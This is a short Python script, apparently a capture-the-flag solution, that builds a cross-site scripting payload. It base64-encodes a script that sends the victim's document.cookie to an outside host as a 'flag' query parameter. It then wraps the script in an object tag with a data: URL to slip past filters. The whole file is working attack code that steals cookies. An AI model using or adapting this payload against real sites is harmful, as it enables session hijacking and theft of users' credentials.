from base64 import b64encode

script = '''<script>
window.location='https://www.csie.ntu.edu.tw/~b04902053/get/?flag='+escape(document.cookie);
alert('https://www.csie.ntu.edu.tw/~b04902053/get/?flag='+document.cookie);
</script>
'''

b64 = b64encode(script.encode()).decode()
payload = '<object data="data:text/html;base64,{}">'.format(b64)
print(payload)
